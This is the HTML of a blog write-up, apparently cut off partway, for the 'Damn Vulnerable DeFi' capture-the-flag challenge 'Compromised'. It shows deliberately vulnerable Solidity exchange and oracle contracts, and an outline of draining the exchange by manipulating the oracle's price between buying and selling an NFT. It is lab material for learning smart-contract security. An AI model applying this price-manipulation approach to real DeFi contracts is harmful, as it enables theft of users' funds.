@@ -1,0 +1,755 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Damn Vulnerable DeFi - Challenge #7 - Compromised - della&#39;s blog</title><meta name="Description" content="della&#39;s blog"><meta property="og:title" content="Damn Vulnerable DeFi - Challenge #7 - Compromised" />
+<meta property="og:description" content="Solution for &ldquo;Damn Vulnerable DeFi - Challenge #7 - Compromised&rdquo;." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://dellalibera.github.io/posts/damnvulnerabledefi_07_compromised/" /><meta property="og:image" content="https://dellalibera.github.io"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-09-18T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-09-18T00:00:00+00:00" /><meta property="og:site_name" content="della&#39;s blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://dellalibera.github.io"/>
+
+<meta name="twitter:title" content="Damn Vulnerable DeFi - Challenge #7 - Compromised"/>
+<meta name="twitter:description" content="Solution for &ldquo;Damn Vulnerable DeFi - Challenge #7 - Compromised&rdquo;."/>
+<meta name="application-name" content="della&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="della&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dellalibera.github.io/posts/damnvulnerabledefi_07_compromised/" /><link rel="prev" href="https://dellalibera.github.io/posts/damnvulnerabledefi_06_selfie/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Damn Vulnerable DeFi - Challenge #7 - Compromised",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/dellalibera.github.io\/posts\/damnvulnerabledefi_07_compromised\/"
+        },"genre": "posts","keywords": "Damn Vulnerable DeFi, CTF, Solidity, Blockchain","wordcount":  2503 ,
+        "url": "https:\/\/dellalibera.github.io\/posts\/damnvulnerabledefi_07_compromised\/","datePublished": "2022-09-18T00:00:00+00:00","dateModified": "2022-09-18T00:00:00+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "della"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="della&#39;s blog">della&#39;s blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/"> Home </a><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/advisories/"> Advisories </a><a class="menu-item" href="/about/"> About </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="della&#39;s blog">della&#39;s blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/" title="">Home</a><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/advisories/" title="">Advisories</a><a class="menu-item" href="/about/" title="">About</a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title">Damn Vulnerable DeFi - Challenge #7 - Compromised</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://dellalibera.github.io/about/" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>della</a></span>&nbsp;<span class="post-category">included in <a href="/categories/writeup/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Writeup</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="September 18, 2022">September 18, 2022</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;2503 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;12 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-challenge">1) Challenge</a></li>
+    <li><a href="#2-code-review">2) Code Review</a>
+      <ul>
+        <li><a href="#21-trustfuloracleinitializersol">2.1) <code>TrustfulOracleInitializer.sol</code></a></li>
+        <li><a href="#22-exchangesol">2.2) <code>Exchange.sol</code></a></li>
+        <li><a href="#23-trustfuloraclesol">2.3) <code>TrustfulOracle.sol</code></a></li>
+        <li><a href="#24-server-data">2.4) Server Data</a></li>
+      </ul>
+    </li>
+    <li><a href="#3-solution">3) Solution</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><div id="id-1">Solution for &ldquo;Damn Vulnerable DeFi - Challenge #7 - Compromised&rdquo;.</div>
+<h2 id="1-challenge">1) Challenge</h2>
+<div class="details admonition quote open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-quote-right fa-fw" aria-hidden="true"></i>Description<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>While poking around a web service of one of the most popular DeFi projects in the space, you get a somewhat strange response from their server. This is a snippet:</p>
+<pre><code>HTTP/2 200 OK
+content-type: text/html
+content-language: en
+vary: Accept-Encoding
+server: cloudflare
+
+4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35
+
+4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
+</code></pre>
+<p>A related on-chain exchange is selling (absurdly overpriced) collectibles called &ldquo;DVNFT&rdquo;, now at 999 ETH each. This price is fetched from an on-chain oracle, and is based on three trusted reporters:</p>
+<pre><code>0xA73209FB1a42495120166736362A1DfA9F95A105
+0xe92401A4d3af5E446d93D11EEc806b1462b39D15 
+0x81A5D6E50C214044bE44cA0CB057fe119097850c
+</code></pre>
+<p>Starting with only 0.1 ETH in balance, you must steal all ETH available in the exchange. (<a href="https://www.damnvulnerabledefi.xyz/challenges/7.html" target="_blank" rel="noopener noreffer ">link</a>)</p>
+</div>
+        </div>
+    </div>
+<p>Challenge created by <a href="https://twitter.com/tinchoabbate" target="_blank" rel="noopener noreffer ">@tinchoabbate</a>.</p>
+<h2 id="2-code-review">2) Code Review</h2>
+<p>In this challenge there are 3 smart contracts: <code>TrustfulOracleInitializer.sol</code>, <code>Exchange.sol</code> and <code>TrustfulOracle.sol</code>.</p>
+<h3 id="21-trustfuloracleinitializersol">2.1) <code>TrustfulOracleInitializer.sol</code></h3>
+<p>This contract (<a href="https://github.com/tinchoabbate/damn-vulnerable-defi/blob/master/contracts/compromised/TrustfulOracleInitializer.sol" target="_blank" rel="noopener noreffer ">source code</a>) is responsible for creating the oracle contract with different sources (line <code>22</code>) and set the initial price (line <code>23</code>). In our case, the initial price for an NFT is <code>999 ETH</code> (<a href="https://github.com/tinchoabbate/damn-vulnerable-defi/blob/master/test/compromised/compromised.challenge.js#L50" target="_blank" rel="noopener noreffer ">setup</a>).</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#00f">contract</span> <span style="color:#000">TrustfulOracleInitializer</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">event</span> <span style="color:#000">NewTrustfulOracle</span>(<span style="color:#00f">address</span> <span style="color:#000">oracleAddress</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#000">TrustfulOracle</span> <span style="color:#00f">public</span> <span style="color:#000">oracle</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">constructor</span>(
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">address</span>[] <span style="color:#00f">memory</span> <span style="color:#000">sources</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">string</span>[] <span style="color:#00f">memory</span> <span style="color:#000">symbols</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">uint256</span>[] <span style="color:#00f">memory</span> <span style="color:#000">initialPrices</span>
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#000">oracle</span> = <span style="color:#00f">new</span> <span style="color:#000">TrustfulOracle</span>(<span style="color:#000">sources</span>, <span style="color:#00f">true</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#000">oracle</span>.<span style="color:#000">setupInitialPrices</span>(<span style="color:#000">sources</span>, <span style="color:#000">symbols</span>, <span style="color:#000">initialPrices</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#000">emit</span> <span style="color:#000">NewTrustfulOracle</span>(<span style="color:#00f">address</span>(<span style="color:#000">oracle</span>));
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></td></tr></table>
+</div>
+</div>
+<h3 id="22-exchangesol">2.2) <code>Exchange.sol</code></h3>
+<p>This contract (<a href="https://github.com/tinchoabbate/damn-vulnerable-defi/blob/master/contracts/compromised/Exchange.sol" target="_blank" rel="noopener noreffer ">source code</a>) allows users to buy and sell <code>DVNFT</code> NFT tokens at the initial price of <code>99 EHT</code> each.</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#00f">contract</span> <span style="color:#000">Exchange</span> <span style="color:#00f">is</span> <span style="color:#000">ReentrancyGuard</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">using</span> <span style="color:#000">Address</span> <span style="color:#00f">for</span> <span style="color:#00f">address</span> <span style="color:#00f">payable</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#000">DamnValuableNFT</span> <span style="color:#00f">public</span> <span style="color:#00f">immutable</span> <span style="color:#000">token</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#000">TrustfulOracle</span> <span style="color:#00f">public</span> <span style="color:#00f">immutable</span> <span style="color:#000">oracle</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">event</span> <span style="color:#000">TokenBought</span>(<span style="color:#00f">address</span> <span style="color:#00f">indexed</span> <span style="color:#000">buyer</span>, <span style="color:#00f">uint256</span> <span style="color:#000">tokenId</span>, <span style="color:#00f">uint256</span> <span style="color:#000">price</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">event</span> <span style="color:#000">TokenSold</span>(<span style="color:#00f">address</span> <span style="color:#00f">indexed</span> <span style="color:#000">seller</span>, <span style="color:#00f">uint256</span> <span style="color:#000">tokenId</span>, <span style="color:#00f">uint256</span> <span style="color:#000">price</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">constructor</span>(<span style="color:#00f">address</span> <span style="color:#000">oracleAddress</span>) <span style="color:#00f">payable</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#000">token</span> = <span style="color:#00f">new</span> <span style="color:#000">DamnValuableNFT</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#000">oracle</span> = <span style="color:#000">TrustfulOracle</span>(<span style="color:#000">oracleAddress</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">buyOne</span>() <span style="color:#00f">external</span> <span style="color:#00f">payable</span> <span style="color:#000">nonReentrant</span> <span style="color:#00f">returns</span> (<span style="color:#00f">uint256</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">uint256</span> <span style="color:#000">amountPaidInWei</span> = <span style="color:#000">msg</span>.<span style="color:#000">value</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#000">require</span>(<span style="color:#000">amountPaidInWei</span> &gt; <span style="color:#3af">0</span>, <span style="color:#5a2">&#34;Amount paid must be greater than zero&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#888;font-style:italic">// Price should be in [wei / NFT]
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>        <span style="color:#00f">uint256</span> <span style="color:#000">currentPriceInWei</span> = <span style="color:#000">oracle</span>.<span style="color:#000">getMedianPrice</span>(<span style="color:#000">token</span>.<span style="color:#000">symbol</span>());
+</span></span><span style="display:flex;"><span>        <span style="color:#000">require</span>(<span style="color:#000">amountPaidInWei</span> &gt;= <span style="color:#000">currentPriceInWei</span>, <span style="color:#5a2">&#34;Amount paid is not enough&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">uint256</span> <span style="color:#000">tokenId</span> = <span style="color:#000">token</span>.<span style="color:#000">safeMint</span>(<span style="color:#000">msg</span>.<span style="color:#000">sender</span>);
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">payable</span>(<span style="color:#000">msg</span>.<span style="color:#000">sender</span>).<span style="color:#000">sendValue</span>(<span style="color:#000">amountPaidInWei</span> - <span style="color:#000">currentPriceInWei</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#000">emit</span> <span style="color:#000">TokenBought</span>(<span style="color:#000">msg</span>.<span style="color:#000">sender</span>, <span style="color:#000">tokenId</span>, <span style="color:#000">currentPriceInWei</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">return</span> <span style="color:#000">tokenId</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">sellOne</span>(<span style="color:#00f">uint256</span> <span style="color:#000">tokenId</span>) <span style="color:#00f">external</span> <span style="color:#000">nonReentrant</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#000">require</span>(<span style="color:#000">msg</span>.<span style="color:#000">sender</span> == <span style="color:#000">token</span>.<span style="color:#000">ownerOf</span>(<span style="color:#000">tokenId</span>), <span style="color:#5a2">&#34;Seller must be the owner&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#000">require</span>(<span style="color:#000">token</span>.<span style="color:#000">getApproved</span>(<span style="color:#000">tokenId</span>) == <span style="color:#00f">address</span>(<span style="color:#000">this</span>), <span style="color:#5a2">&#34;Seller must have approved transfer&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#888;font-style:italic">// Price should be in [wei / NFT]
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>        <span style="color:#00f">uint256</span> <span style="color:#000">currentPriceInWei</span> = <span style="color:#000">oracle</span>.<span style="color:#000">getMedianPrice</span>(<span style="color:#000">token</span>.<span style="color:#000">symbol</span>());
+</span></span><span style="display:flex;"><span>        <span style="color:#000">require</span>(<span style="color:#00f">address</span>(<span style="color:#000">this</span>).<span style="color:#000">balance</span> &gt;= <span style="color:#000">currentPriceInWei</span>, <span style="color:#5a2">&#34;Not enough ETH in balance&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#000">token</span>.<span style="color:#000">transferFrom</span>(<span style="color:#000">msg</span>.<span style="color:#000">sender</span>, <span style="color:#00f">address</span>(<span style="color:#000">this</span>), <span style="color:#000">tokenId</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#000">token</span>.<span style="color:#000">burn</span>(<span style="color:#000">tokenId</span>);
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">payable</span>(<span style="color:#000">msg</span>.<span style="color:#000">sender</span>).<span style="color:#000">sendValue</span>(<span style="color:#000">currentPriceInWei</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#000">emit</span> <span style="color:#000">TokenSold</span>(<span style="color:#000">msg</span>.<span style="color:#000">sender</span>, <span style="color:#000">tokenId</span>, <span style="color:#000">currentPriceInWei</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#000">receive</span>() <span style="color:#00f">external</span> <span style="color:#00f">payable</span> {}
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></td></tr></table>
+</div>
+</div>
+<p>It implements <code>2</code> main functions:</p>
+<ul>
+<li><code>buyOne</code>:
+<ul>
+<li>checks that the amount to buy an NFT is <code>&gt; 0</code> (line <code>31</code>)</li>
+<li>computes the buy price of the NFT by calling the <code>getMedianPrice</code> function from the Oracle contract (line <code>34</code>)</li>
+<li>checks if the amount is <code>&gt;</code> than the NFT price (line <code>35</code>)</li>
+<li>mints a new NFT token and sends it to <code>msg.sender</code> (line <code>37</code>)</li>
+<li>finally, it returns the NFT id (line <code>43</code>)</li>
+</ul>
+</li>
+<li><code>sellOne</code>:
+<ul>
+<li>checks if the <code>msg.sender</code> is the owner of the NFT (line <code>47</code>)</li>
+<li>checks if the <code>msg.sender</code> approved the selling of the NFT (line <code>48</code>)</li>
+<li>computes the selling price of the NFT by calling the <code>getMedianPrice</code> function from the Oracle contract (line <code>51</code>)</li>
+<li>checks if the contract has enough balance to pay the NFT price (line <code>52</code>)</li>
+<li>transfers the NFT from the <code>msg.sender</code> to the contract address (line <code>54</code>)</li>
+<li>pays the NFT price to the <code>msg.sender</code> (line <code>57</code>)</li>
+</ul>
+</li>
+</ul>
+<p>The buy and sell prices are retrieved from the oracle function <code>getMedianPrice</code>. It means that if we can buy an NFT token at a low price and then somehow change the price to be equal to the contract balance when we sell it, we&rsquo;ll be able to steal all the contract balance (line <code>57</code> will send us all the contract balance).</p>
+<h3 id="23-trustfuloraclesol">2.3) <code>TrustfulOracle.sol</code></h3>
+<p>This contract (<a href="https://github.com/tinchoabbate/damn-vulnerable-defi/blob/master/contracts/compromised/TrustfulOracle.sol" target="_blank" rel="noopener noreffer ">source code</a>) is responsible for providing the NFT price.</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 14
